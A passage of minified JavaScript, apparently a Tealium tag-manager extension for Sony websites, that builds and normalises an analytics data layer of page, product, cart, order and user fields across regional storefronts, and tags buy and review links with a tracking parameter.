tion.pathname)?(c="articles:tips",l="articles:list:tips"):/^Page-AlphaUniverse-Tip_Tricks_Detail-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/pro-tips\//gi.test(window.location.pathname)?(c=/^Page-AlphaUniverse-Tip_Tricks_Detail-.*/gi.test(d)?"articles:tips:"+d.replace(/Page-AlphaUniverse-Tip_Tricks_Detail-/gi,"").replace(/-.._..-\d{4}-\d{2}/gi,"").toLowerCase():"articles:tips:"+window.location.pathname.replace(/^\/(..\/)?alphauniverse\/pro-tips\//,"").toLowerCase(),l="articles:details:tips"):/^Page-AlphaUniverse-Inspire_List-*/gi.test(d)||/^\/(..\/)?alphauniverse\/inspire(?!\/)/gi.test(window.location.pathname)?(c="articles:inspire",l="articles:list:inspire"):/^Page-AlphaUniverse-Inspire_Detail-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/inspire\//gi.test(window.location.pathname)?(c=/^Page-AlphaUniverse-Inspire_Detail-.*/gi.test(d)?"articles:tips:"+d.replace(/Page-AlphaUniverse-Inspire_Detail-/gi,"").replace(/-.._..-\d{4}-\d{2}/gi,"").toLowerCase():"articles:inspire:"+window.location.pathname.replace(/^\/(..\/)?alphauniverse\/inspire\//,"").toLowerCase(),l="articles:details:inspire"):/^Page-AlphaUniverse-News_List-*/gi.test(d)||/^\/(..\/)?alphauniverse\/news(?!\/)/gi.test(window.location.pathname)?(c="articles:news",l="articles:list:news"):/^Page-AlphaUniverse-News_Detail-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/news\//gi.test(window.location.pathname)?(c=/^Page-AlphaUniverse-News_Detail-.*/gi.test(d)?"articles:news:"+d.replace(/Page-AlphaUniverse-News_Detail-/gi,"").replace(/-.._..-\d{4}-\d{2}/gi,"").toLowerCase():"articles:news:"+window.location.pathname.replace(/^\/(..\/)?alphauniverse\/news\//,"").toLowerCase(),l="articles:details:news"):/^Page-AlphaUniverse-amea_stories.*/gi.test(d)||/^\/(..\/)?alphauniverse\/gallery(?!\/)/gi.test(window.location.pathname)?(c="gallery",l="photos-videos-gallery"):/^Page-AlphaUniverse-AlphaLibrary-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/software(?!\/)/gi.test(window.location.pathname)?(c="software",l="software"):/^Page-AlphaUniverse-AlphaLibrary-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/video-creation(?!\/)/gi.test(window.location.pathname)?(c="video-creation",l="video-creation"):(c="other",l="other"),jQuery('head meta[name="analytics-page-template"]').attr("content",l),jQuery('head meta[name="analytics-page-name"]').attr("content",c.substr(0,100))}}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[2]){utag.runonce.ext[2]=1;{function a(){sony.digitalData={},sony.digitalData.version="",sony.digitalData.page={},sony.digitalData.page.pageId="",sony.digitalData.page.name="",sony.digitalData.page.destinationURL="",sony.digitalData.page.country="",sony.digitalData.page.language="",sony.digitalData.page.pageTemplate="",sony.digitalData.page.section="",sony.digitalData.page.responseCode="",sony.digitalData.page.template_revision="",sony.digitalData.page.source="",sony.digitalData.page.layout="",sony.digitalData.page.pageTemplate="",sony.digitalData.page.tabs={},sony.digitalData.page.tabs.count="",sony.digitalData.page.tabs.names=[],sony.digitalData.page.tabs.activeTab="",sony.digitalData.page.modules=[],sony.digitalData.component=[],sony.digitalData.favorites=[],sony.digitalData.category={},sony.digitalData.product={},sony.digitalData.product.category1="",sony.digitalData.product.category2="",sony.digitalData.product.category3="",sony.digitalData.product.category4="",sony.digitalData.product.category5="",sony.digitalData.product.category6="",sony.digitalData.product.category7="",sony.digitalData.product.supermodel="",sony.digitalData.product.model="",sony.digitalData.product.sku="",sony.digitalData.product.gtin=[],sony.digitalData.product.price="",sony.digitalData.product.tier="",sony.digitalData.product.availability="",sony.digitalData.product.ratingAverage="",sony.digitalData.product.reviewsCount="",sony.digitalData.product.energyLabel="",sony.digitalData.product.stockStatus=0,sony.digitalData.product.currency="",sony.digitalData.transition={},sony.digitalData.transition.retailersCount=0,sony.digitalData.transition.retailers=[],sony.digitalData.transition.retailers.name="",sony.digitalData.transition.retailers.linkID="",sony.digitalData.transition.retailers.isInStock="",sony.digitalData.transition.selection={},sony.digitalData.transition.selection.supermodel="",sony.digitalData.transition.selection.model="",sony.digitalData.transition.selection.sku="",sony.digitalData.transition.selection.derivative_sku_ids=[],sony.digitalData.transition.selection.differentiators={},sony.digitalData.transition.campaign_id="",sony.digitalData.transition.campaign_source="",sony.digitalData.search={},sony.digitalData.search.term="",sony.digitalData.search.type="",sony.digitalData.search.clickedResultType="",sony.digitalData.search.clickedResultIndex="",sony.digitalData.search.resultCount="",sony.digitalData.search.category=[],sony.digitalData.search.resultPages="",sony.digitalData.search.current_category="",sony.digitalData.search.suggestions={},sony.digitalData.gallery={},sony.digitalData.gallery.productsCount=0,sony.digitalData.support={},sony.digitalData.support.access="",sony.digitalData.support.agent_country="",sony.digitalData.support.agent_id="",sony.digitalData.support.agent_team="",sony.digitalData.support.article_name="",sony.digitalData.support.channel_name="",sony.digitalData.support.crm_case_id="",sony.digitalData.support.filter_type="",sony.digitalData.support.site_class="",sony.digitalData.support.topics=[],sony.digitalData.download={},sony.digitalData.download.download_number="",sony.digitalData.download.download_type="",sony.digitalData.download.url="",sony.digitalData.user={},sony.digitalData.user.id="",sony.digitalData.user.type="",sony.digitalData.user.existing_customer="",sony.digitalData.user.demographics=[],sony.digitalData.user.email="",sony.digitalData.user.method="",sony.digitalData.user.accountType="",sony.digitalData.user.customerGroup="",sony.digitalData.user.ordersCount="",sony.digitalData.user.productsCount="",sony.digitalData.cart={},sony.digitalData.cart.category=[],sony.digitalData.cart.id="",sony.digitalData.cart.isGift=[],sony.digitalData.cart.name=[],sony.digitalData.cart.paymentType="",sony.digitalData.cart.price=[],sony.digitalData.cart.promoCode=[],sony.digitalData.cart.quantity=[],sony.digitalData.cart.sellingPrice=[],sony.digitalData.cart.origin="",sony.digitalData.cart.shippingMethod="",sony.digitalData.cart.sku=[],sony.digitalData.cart.model=[],sony.digitalData.cart.tax=[],sony.digitalData.cart.total=[],sony.digitalData.cart.additionaService=[],sony.digitalData.cart.additionalServicePrice=[],sony.digitalData.order={},sony.digitalData.order.category=[],sony.digitalData.order.id="",sony.digitalData.order.isGift=[],sony.digitalData.order.name=[],sony.digitalData.order.paymentType="",sony.digitalData.order.flag="",sony.digitalData.order.price=[],sony.digitalData.order.promoCode=[],sony.digitalData.order.quantity=[],sony.digitalData.order.sellingPrice=[],sony.digitalData.order.origin="",sony.digitalData.order.shippingMethod="",sony.digitalData.order.shippingCost=0,sony.digitalData.order.sku=[],sony.digitalData.order.model=[],sony.digitalData.order.tax=[],sony.digitalData.order.total=[],sony.digitalData.order.additionalService=[],sony.digitalData.order.additionalServicePrice=[],sony.digitalData.order.savings=[],sony.digitalData.registration={},sony.digitalData.registration.purchaseDealer="",sony.digitalData.registration.productModel=""}window._bsq=window._bsq||{},_bsq.data=_bsq.data||{},_bsq.config=_bsq.config||{},window.sony=window.sony||{},_bsq.config.startTimerT=Date.now()||0,_bsq.config.maxTimerT=1e4,_bsq.config.pageLoadDone=!1,_bsq.data.initDataLayer=function(e){var t={};try{if(/^global:(gwt|swt)$/gi.test(e))void 0!==(t=(new window.SonyAnalytics).build().analytics||{})&&void 0!==t.product&&(void 0!==t.product.category1&&(t.product.category1=t.product.category1.replace(/^gwx-/g,"")),void 0!==t.product.category2&&(t.product.category2=t.product.category2.replace(/^gwx-/g,"")),void 0!==t.product.category3&&(t.product.category3=t.product.category3.replace(/^gwx-/g,""))),utag.DB("Sony OLD DATA LAYER "),utag.DB(t);else if(/^global:gwn$/gi.test(e))t=void 0,sony.digitalData=buildDataLayer().digitalData||{},utag.DB("Sony GWN DATA LAYER"),utag.DB(sony.digitalData);else if(/^regional:ecommerce$/gi.test(e)&&/(thesonyshop\.ca|sony-development\.myshopify\.com)$/gi.test(window.location.hostname)){t=void 0;var o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),Object.assign(sony.digitalData.page,o.page),Object.assign(sony.digitalData.product,o.product),Object.assign(sony.digitalData.user,o.user),Object.assign(sony.digitalData.cart,o.cart),Object.assign(sony.digitalData.order,o.order),sony.digitalData.page.pageTemplate=o.page.template||"",sony.digitalData.product.price=_bsq.utils.parsePotentiallyGroupedFloat(sony.digitalData.product.price||""),sony.digitalData.cart.price=_bsq.utils.parsePotentiallyGroupedFloat(sony.digitalData.cart.price||[]),sony.digitalData.cart.sellingPrice=_bsq.utils.parsePotentiallyGroupedFloat(sony.digitalData.cart.sellingPrice||[]),sony.digitalData.order.price=_bsq.utils.parsePotentiallyGroupedFloat(sony.digitalData.order.price||[]),sony.digitalData.order.sellingPrice=_bsq.utils.parsePotentiallyGroupedFloat(sony.digitalData.order.sellingPrice||[]),utag.DB("Shopgentec Canada"),utag.DB(t)}else if(/^regional:ecommerce$/gi.test(e)&&/(store\.sony\.(com\.au|co\.nz)|(development|staging)-web-sony\.demandware\.net)$/gi.test(window.location.hostname)){t=void 0;o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),Object.assign(sony.digitalData.page,o.page),Object.assign(sony.digitalData.gallery,o.gallery||{}),Object.assign(sony.digitalData.search,o.search||{}),Object.assign(sony.digitalData.product,o.product),Object.assign(sony.digitalData.user,o.user),Object.assign(sony.digitalData.cart,o.cart),Object.assign(sony.digitalData.order,o.order),utag.DB("ANZ Store"),utag.DB(t)}else if(/^regional:ecommerce$/gi.test(e)&&/(electronics\.sony\.com)$/gi.test(window.location.hostname)){t=void 0;o=JSON.parse(JSON.stringify(sony.digitalData||{}));a(),sony.digitalData.version=o.version||{},Object.assign(sony.digitalData.page,o.page||{}),Object.assign(sony.digitalData.product,o.product||{}),Object.assign(sony.digitalData.user,o.user||{}),Object.assign(sony.digitalData.gallery,o.gallery||{}),Object.assign(sony.digitalData.search,o.search||{}),Object.assign(sony.digitalData.component,o.component||{}),Object.assign(sony.digitalData.cart,o.cart||{}),Object.assign(sony.digitalData.order,o.order||{}),utag.DB("SNA EC"),utag.DB(sony.digitalData)}else if(/^regional:marketing/gi.test(e)&&/(scene\.sonyanz\.com|sonyscene\.uat\.webcoda\.net\.au|cloud\.marketing\.sony\.com\.au)$/gi.test(window.location.hostname)){t=void 0;try{o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),Object.assign(sony.digitalData.page,o.page||{}),sony.digitalData.page.pageTemplate=(o.page.template||"").toLowerCase(),sony.digitalData.page.name=(o.page.name||"").toLowerCase(),utag.DB("ANZ Sony Scene/AU Cloud Marketing"),utag.DB(sony.digitalData)}catch(e){t={},console.log("catch scene exception "+e+"\n")}}else if(/^regional:ecommerce$/gi.test(e)&&/((preview-uat-pdp\.)?sony\.(co\.uk|de))$/gi.test(window.location.hostname)&&/^\/store/gi.test(window.location.pathname)){t=void 0;o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),sony.digitalData.version=o.version||{},Object.assign(sony.digitalData.page,o.page||{}),Object.assign(sony.digitalData.product,o.product||{}),Object.assign(sony.digitalData.user,o.user||{}),Object.assign(sony.digitalData.search,o.search||{}),Object.assign(sony.digitalData.cart,o.cart||{}),Object.assign(sony.digitalData.order,o.order||{}),sony.digitalData.cart.id=void 0!==o.cart&&void 0!==o.cart.cartId&&o.cart.cartId||"",sony.digitalData.order.id=void 0!==o.order&&void 0!==o.order.ID&&o.order.ID||"",utag.DB("SEU EC"),utag.DB(sony.digitalData)}else if(/^regional:marketing/gi.test(e)&&/(sonycine\.com|77snszqv-dev\.webengine\.zesty\.io)$/gi.test(window.location.hostname)){t=void 0;try{o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),Object.assign(sony.digitalData.page,o.page||{}),sony.digitalData.page.name=(o.page.name||"").toLowerCase(),utag.DB("Sony Cine"),utag.DB(sony.digitalData)}catch(e){t={},console.log("catch scene exception "+e+"\n")}}else if(/^regional:marketing/gi.test(e)&&/^(stg\.)?alphauniverse\.(sony-asia\.com|sony\.(com\.(sg|my|ph|hk|tw|vn)|co\.(id|th)))$/gi.test(window.location.hostname)){t=void 0;try{o=JSON.parse(JSON.stringify(buildSonyDataLayer().digitalData));a(),Object.assign(sony.digitalData.page,o.page||{}),sony.digitalData.page.filters=(o.page.filters||"").toLowerCase(),utag.DB("APAC AlphaUniverse"),utag.DB(sony.digitalData)}catch(e){t={},console.log("catch APAC AU exception "+sceneException+"\n")}}else if(/^global:gwx$/gi.test(e)){t=void 0;o=JSON.parse(JSON.stringify(buildSonyDataLayer().sony.digitalData));a(),sony.digitalData.version=o.version||{},sony.digitalData.environment=o.environment||{},Object.assign(sony.digitalData.page,o.page||{}),Object.assign(sony.digitalData.component,o.component||{}),Object.assign(sony.digitalData.product,o.product||{}),Object.assign(sony.digitalData.category,o.category||{}),Object.assign(sony.digitalData.transition,o.transition||{}),Object.assign(sony.digitalData.favorites,o.favorites||{}),Object.assign(sony.digitalData.search,o.search||{}),Object.assign(sony.digitalData.user,o.user||{}),sony.digitalData.page.name=sony.digitalData.page.name.replace(/^gwx-/g,""),sony.digitalData.product.category1=sony.digitalData.product.category1.replace(/^gwx-/g,""),sony.digitalData.product.category2=sony.digitalData.product.category2.replace(/^gwx-/g,""),sony.digitalData.product.category3=sony.digitalData.product.category3.replace(/^gwx-/g,""),void 0!==sony.digitalData.page.pageTemplate&&(/category_(gallery|accessories|compare)/gi.test(sony.digitalData.page.pageTemplate)?sony.digitalData.page.pageTemplate="gallery":"pdp_reviews"===sony.digitalData.page.pageTemplate?sony.digitalData.page.pageTemplate:/^oof|category_oof|pdp_oof$/.test(sony.digitalData.page.pageTemplate)?sony.digitalData.page.pageTemplate="oof":"other"===sony.digitalData.page.pageTemplate&&("all_electronics"===sony.digitalData.page.name?sony.digitalData.page.pageTemplate="all-electronics":"favorites"===sony.digitalData.page.name?sony.digitalData.page.pageTemplate="my favorites":"locale_selector"===sony.digitalData.page.name?sony.digitalData.page.pageTemplate="locale_selector":"dealer_locator"===sony.digitalData.page.name?sony.digitalData.page.pageTemplate="dealer locator":/language-selection|language_selection/gi.test(sony.digitalData.page.name)?sony.digitalData.page.pageTemplate="language-selection":/^(404|500|other:(404|500))$/.test(sony.digitalData.page.name)?sony.digitalData.page.pageTemplate="error":/search/.test(sony.digitalData.page.name)&&(sony.digitalData.page.pageTemplate="search"))),utag.DB("Sony GWX"),utag.DB(sony.digitalData)}else t=(new window.SonyAnalytics).build().analytics||(new window.SonyAnalytics).build()||{},utag.DB("Sony OLD DATA LAYER "),utag.DB(t)}catch(e){console.log("catch e"+e+"\n")}return void 0===t?sony.digitalData:_bsq.data.gwtToGwnDataLayer(t)},_bsq.data.gwtToGwnDataLayer=function(e){try{if(void 0!==e){if(sony.digitalData=sony.digitalData||{},sony.digitalData.version=e.version||"",sony.digitalData.page={},sony.digitalData.page.pageId="",sony.digitalData.page.name=void 0!==e.page&&e.page.name||"",sony.digitalData.page.destinationURL="",sony.digitalData.page.country=(void 0!==e.page&&e.page.country||"").toUpperCase(),sony.digitalData.page.language=(void 0!==e.page&&e.page.language||"").toLowerCase(),sony.digitalData.page.pageTemplate=void 0!==e.page&&e.page.template||"",sony.digitalData.page.section=void 0!==e.page&&e.page.section||"",sony.digitalData.page.responseCode="",sony.digitalData.page.template_revision=void 0!==e.page&&e.page.template_revision||"",sony.digitalData.page.source=void 0!==e.page&&e.page.source||"",sony.digitalData.page.source=sony.digitalData.page.source.replace(/"/gi,""),sony.digitalData.page.layout=void 0!==e.page&&e.page.layout||"",sony.digitalData.page.modules=void 0!==e.page&&e.page.modules||[],sony.digitalData.page.filters=void 0!==e.page&&e.page.filters_selected||"",sony.digitalData.page.tabs={},sony.digitalData.page.tabs.count=void 0!==e.page&&e.page.tab_count||"",sony.digitalData.page.tabs.names=[],sony.digitalData.page.tabs.activeTab=void 0!==e.page&&e.page.tab_name||"",sony.digitalData.page.tags=void 0!==e.page&&e.page.tags||{},sony.digitalData.component=[],sony.digitalData.product={},sony.digitalData.product.category1=(s=void 0!==e.product&&e.product.category1||"",s=Array.isArray(s)?s.map((function(e){return e.toLowerCase()||""})):s.toLowerCase()||""),sony.digitalData.product.category2=function(){var t=void 0!==e.product&&e.product.category2||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.category3=function(){var t=void 0!==e.product&&e.product.category3||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.category4=function(){var t=void 0!==e.product&&e.product.category4||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.category5=function(){var t=void 0!==e.product&&e.product.category5||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.category6=function(){var t=void 0!==e.product&&e.product.category6||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.category7=function(){var t=void 0!==e.product&&e.product.category7||"";return t=Array.isArray(t)?t.map((function(e){return e.toLowerCase()||""})):t.toLowerCase()||""}(),sony.digitalData.product.supermodel=function(){var t=void 0!==e.product&&e.product.supermodel_ids||[];return t=void 0!==e.transition&&void 0!==e.transition.selection?e.transition.selection.supermodel_id||[]:t,Array.isArray(t)?t:[t]}(),sony.digitalData.product.model=function(){var t=void 0!==e.product&&e.product.model_ids||[];return t=void 0!==e.transition&&void 0!==e.transition.selection?e.transition.selection.model_id||[]:t,Array.isArray(t)?t:[t]}(),sony.digitalData.product.sku=function(){var t=void 0!==e.product&&(e.product.sku_ids||e.product.product_ids||e.product.sku_id)||[];return t=void 0!==e.transition&&void 0!==e.transition.selection?e.transition.selection.sku_id||[]:t,Array.isArray(t)?t:[t]}(),sony.digitalData.product.gtin=[],sony.digitalData.product.price=void 0!==e.product&&e.product.price||"",sony.digitalData.product.tier=void 0!==e.product&&e.product.tier||"",sony.digitalData.product.availability="",sony.digitalData.product.ratingAverage=void 0!==e.product&&(e.product.average_ratings||e.product.rating)||"",sony.digitalData.product.reviewsCount=void 0!==e.product&&e.product.number_of_reviews||"",sony.digitalData.product.energyLabel="",sony.digitalData.product.stockStatus=void 0!==e.product&&e.product.stock_status||0,sony.digitalData.product.currency=void 0!==e.product&&e.product.currency||"",sony.digitalData.transition={},sony.digitalData.transition.retailersCount=void 0!==e.transition&&e.transition.listSize||0,sony.digitalData.transition.retailers=[],sony.digitalData.transition.retailers.name="",sony.digitalData.transition.retailers.linkID="",sony.digitalData.transition.retailers.isInStock="",sony.digitalData.transition.selection=void 0!==e.transition&&e.transition.selection||{},sony.digitalData.transition.selection.supermodel=void 0!==e.transition&&void 0!==e.transition.selection&&e.transition.selection.supermodel_id||"",sony.digitalData.transition.selection.model=void 0!==e.transition&&void 0!==e.transition.selection&&e.transition.selection.model_id||"",sony.digitalData.transition.selection.sku=void 0!==e.transition&&void 0!==e.transition.selection&&e.transition.selection.sku_id||"",sony.digitalData.transition.selection.derivative_sku_ids=void 0!==e.transition&&void 0!==e.transition.selection&&e.transition.selection.derivative_sku_ids||[],sony.digitalData.transition.selection.differentiators=void 0!==e.transition&&void 0!==e.transition.selection&&e.transition.selection.differentiators||{},sony.digitalData.transition.campaign_id=void 0!==e.transition&&e.transition.campaign_id||"",sony.digitalData.transition.campaign_source=void 0!==e.transition&&e.transition.campaign_source||"",sony.digitalData.search={},sony.digitalData.search.term=void 0!==e.search&&e.search.term||"",sony.digitalData.search.type=void 0!==e.search&&e.search.term_source||"",sony.digitalData.search.clickedResultType="",sony.digitalData.search.clickedResultIndex="",sony.digitalData.search.resultCount=void 0!==e.search&&void 0!==e.search.results?e.search.results+""||"":void 0!==e.search&&void 0!==e.search.resultCount&&e.search.resultCount+""||"",sony.digitalData.search.category=function(){var t=void 0!==e.search&&e.search.categories||[],a=[];return Object.keys(t).forEach((function(e,o){a.push({name:e,count:Object.values(t)[o]})})),a}(),sony.digitalData.search.resultPages="",sony.digitalData.search.current_category=void 0!==e.search&&e.search.current_category||"",sony.digitalData.search.suggestions=void 0!==e.search&&e.search.suggestions||{},sony.digitalData.gallery=void 0!==e.gallery&&e.gallery||void 0,void 0!==sony.digitalData.gallery&&(sony.digitalData.gallery.productsCount=e.gallery.productsCount||0),sony.digitalData.support={},sony.digitalData.support.access=void 0!==e.support&&e.support.access||"",sony.digitalData.support.agent_country=void 0!==e.support&&e.support.agent_country||"",sony.digitalData.support.agent_id=void 0!==e.support&&e.support.agent_id||"",sony.digitalData.support.agent_team=void 0!==e.support&&e.support.agent_team||"",sony.digitalData.support.article_name=void 0!==e.support&&e.support.article_name||"",sony.digitalData.support.channel_name=void 0!==e.support&&e.support.channel_name||"",sony.digitalData.support.crm_case_id=void 0!==e.support&&e.support.crm_case_id||"",sony.digitalData.support.filter_type=void 0!==e.support&&e.support.filter_type||"",sony.digitalData.support.site_class=void 0!==e.support&&e.support.site_class||"",sony.digitalData.support.topics=void 0!==e.support&&e.support.topics||[],sony.digitalData.download={},sony.digitalData.download.download_number=void 0!==e.download&&e.download.download_number||"",sony.digitalData.download.download_type=void 0!==e.download&&e.download.download_type||"",sony.digitalData.download.url=void 0!==e.download&&e.download.url||"",sony.digitalData.user={},sony.digitalData.user.id=void 0!==e.visitor?e.visitor.id||"":void 0!==e.user&&e.user.id||"",sony.digitalData.user.type=void 0!==e.visitor&&e.visitor.type||"",sony.digitalData.user.existing_customer=void 0!==e.visitor&&e.visitor.existing_customer||"",sony.digitalData.user.demographics=[],sony.digitalData.user.email=void 0!==e.user&&e.user.email||"",sony.digitalData.user.method=void 0!==e.user&&e.user.method||"",sony.digitalData.user.accountType=void 0!==e.user&&e.user.accountType||"",sony.digitalData.user.customerGroup=void 0!==e.user&&e.user.customerGroup||"",sony.digitalData.user.ordersCount=void 0!==e.user&&e.user.ordersCount||"",sony.digitalData.user.productsCount=void 0!==e.user&&e.user.productsCount||"",sony.digitalData.cart={},sony.digitalData.cart.category=[],sony.digitalData.cart.id="",sony.digitalData.cart.isGift=[],sony.digitalData.cart.name=[],sony.digitalData.cart.paymentType="",sony.digitalData.cart.price=[],sony.digitalData.cart.promoCode=[],sony.digitalData.cart.quantity=[],sony.digitalData.cart.sellingPrice=[],sony.digitalData.cart.origin="",sony.digitalData.cart.shippingMethod="",sony.digitalData.cart.sku=[],sony.digitalData.cart.model=[],sony.digitalData.cart.tax=[],sony.digitalData.cart.total=[],sony.digitalData.cart.additionaService=[],sony.digitalData.cart.additionalServicePrice=[],/RU/gi.test(sony.digitalData.page.country)&&!1===/sso:checkout:thank you/gi.test(sony.digitalData.page.name)&&"regional:ecommerce"===utag_data.website_platform){var t={price:"price",quantity:"quantity",sku_ids:"sku"};void 0!==e.order&&Object.keys(e.order).forEach((function(a,o){void 0!==t[a]&&(sony.digitalData.cart[t[a]]=e.order[a])}))}else if(/HK/gi.test(sony.digitalData.page.country)&&/\/webapp\/cart\/(?!(thankyou|memberSave))/gi.test(document.URL)&&"regional:ecommerce"===utag_data.website_platform){var a={net_price:"price",tax_price:"tax",quantity:"quantity",sku_ids:"sku",sku_category:"category"};""===e.page.template&&""!==e.page.template_revision&&(sony.digitalData.page.pageTemplate=e.page.template_revision.replace("amea:",""),sony.digitalData.page.name=e.page.template_revision.replace("amea:","")),void 0!==e.cart&&Object.keys(e.cart).forEach((function(t,o){void 0!==a[t]&&(sony.digitalData.cart[a[t]]=e.cart[t])}))}else if("regional:ecommerce"===utag_data.website_platform){var o={isGift:"isGift",name:"name",paymentType:"paymentType",net_price:"price",promoCode:"promoCode",quantity:"quantity",sellingPrice:"sellingPrice",sku_ids:"sku",model_ids:"model",tax_price:"tax",total_price:"total",shipping:"shippingMethod"};void 0!==e.cart&&Object.keys(e.cart).forEach((function(t,a){void 0!==o[t]&&(sony.digitalData.cart[o[t]]=e.cart[t])}))}if(sony.digitalData.order={},sony.digitalData.order.category=[],sony.digitalData.order.id="",sony.digitalData.order.isGift=[],sony.digitalData.order.name=[],sony.digitalData.order.paymentType="",sony.digitalData.order.flag="",sony.digitalData.order.price=[],sony.digitalData.order.promoCode=[],sony.digitalData.order.quantity=[],sony.digitalData.order.sellingPrice=[],sony.digitalData.order.origin="",sony.digitalData.order.shippingMethod="",sony.digitalData.order.shippingCost=0,sony.digitalData.order.sku=[],sony.digitalData.order.model=[],sony.digitalData.order.tax=[],sony.digitalData.order.total=[],sony.digitalData.order.additionalService=[],sony.digitalData.order.additionalServicePrice=[],sony.digitalData.order.savings=[],/RU/gi.test(sony.digitalData.page.country)&&!0===/sso:checkout:thank you/gi.test(sony.digitalData.page.name)&&"regional:ecommerce"===utag_data.website_platform){var i={id:"id",price:"price",quantity:"quantity",sku_ids:"sku",payment_method:"paymentType"};void 0!==e.order&&Object.keys(e.order).forEach((function(t,a){void 0!==i[t]&&(sony.digitalData.order[i[t]]=e.order[t])}))}else if(/HK/gi.test(sony.digitalData.page.country)&&/\/webapp\/cart\/(thankyou|memberSave)/gi.test(document.URL)&&"regional:ecommerce"===utag_data.website_platform){var r={id:"id",net_price:"price",tax_price:"tax",quantity:"quantity",sku_ids:"sku",sku_category:"category",payment_method:"paymentType"};""===e.page.template&&""!==e.page.template_revision&&(sony.digitalData.page.pageTemplate=e.page.template_revision.replace("amea:",""),sony.digitalData.page.name=e.page.template_revision.replace("amea:","")),void 0!==e.order&&Object.keys(e.order).forEach((function(t,a){void 0!==r[t]&&(sony.digitalData.order[r[t]]=e.order[t])}))}else if("regional:ecommerce"===utag_data.website_platform){var n={id:"id",isGift:"isGift",name:"name",payment_type:"paymentType",net_price:"price",promoCode:"promoCode",quantity:"quantity",sellingPrice:"sellingPrice",sku_ids:"sku",model_ids:"model",tax_price:"tax",total_price:"total",shipping_method:"shippingMethod",shipping_cost:"shippingCost"};void 0!==e.order&&Object.keys(e.order).forEach((function(t,a){void 0!==n[t]&&(sony.digitalData.order[n[t]]=e.order[t])}))}sony.digitalData.registration={},sony.digitalData.registration.purchaseDealer="",sony.digitalData.registration.productModel="",/HK/gi.test(sony.digitalData.page.country)&&/\/warranty\//gi.test(document.URL)&&"regional:marketing"===utag_data.website_platform&&void 0!==e.warranty&&(sony.digitalData.registration.purchaseDealer=e.warranty.purchase_channel,sony.digitalData.registration.productModel=e.warranty.model),utag.DB(">>>>>>>>>>>>> Data Layer is created "),utag.DB(sony.digitalData)}}catch(e){utag.DB("Data Layer transformation failed: "+e)}var s;return sony.digitalData},window._bsq=window._bsq||{},window._bsq.state=window._bsq.state||{},window._bsq.aa=window._bsq.aa||{};var o=function(e,t,a){return e+(/\?.+=.*/g.test(e)?"&":"?")+"dtlinfo="+t+"|"+_bsq.state.currentPageName},i=function(e){return _bsq.utils.getQueryParameter(document.URL,"dtlinfo").split("|")[e]||""},r="prdregck",n=new Date;var s={};try{s=_bsq.data.initDataLayer(utag_data.website_platform)||{},_bsq.state.currentPageName=s.page.name,_bsq.state.currentPageName=_bsq.state.currentPageName.replace(/ : /g,":").replace(/ - /g,":").toLowerCase(),_bsq.state.currentPageTemplate=s.page.pageTemplate,d=_bsq.state.currentPageName,/^odw:mysony:register( |)product/gi.test(d)&&"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("#productRegistrationSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(r,"true")})),jQuery("#signInSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(r,"true")})),jQuery("#getIdSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(r,"true")}))),1!==performance.navigation.type&&(_bsq.state.refCTA=i(0),_bsq.state.previousPageName=i(1),""!==_bsq.utils.getQueryParameter(document.URL,"registrationId")&&""!==_bsq.utils.getQueryParameter(document.URL,"product")&&"true"===_bsq.utils.docCookies.getItem(r)&&/^odw:mysony:(productdetail:survey|specialcontent|productregistrationwarrantytab)/gi.test(_bsq.state.currentPageName)&&(_bsq.state.productRegistrationCompleted=!0,_bsq.utils.docCookies.setItem(r,"",n)))}catch(e){console.log(e)}"undefined"!=typeof jQuery&&!1===/((www|uat-pdp|preview-production-pdp)\.sony\.(co\.id|co\.in|co\.ir|co\.kr|co\.nz|co\.th|co\.za|com\.au|com\.cn|com\.my|com\.ph|com\.sg|com\.tw)|(sony-africa|sony-asia|sony-mea)\.com)$/gi.test(window.location.host)&&(-1===document.URL.indexOf("/webapp/")&&jQuery('a[data-id^="buyButton_"][href], div.product-cta > a.btn.buy[href]').on("click",(function(e){/store\.sony\..*/gi.test(jQuery(this).attr("href"))||/pro\.sony/gi.test(jQuery(this).attr("href"))||(void 0===jQuery(this).attr("data-id")&&_bsq.state.pageTemplate,jQuery(this).attr("href",o(jQuery(this).attr("href"),"wtb")))})),"product_details"===_bsq.state.currentPageTemplate&&(jQuery("#product_summary_default span.reviews-text > a").on("click",(function(e){jQuery(this).attr("href",o(jQuery(this).attr("href"),"pdp-summary-reviews"))})),jQuery("#reviews_awards_v2_default div.user-ratings a").on("click",(function(e){jQuery(this).attr("href",o(jQuery(this).attr("href"),"pdp-awards-reviews"))}))))}}}catch(e){utag.DB(e)}var 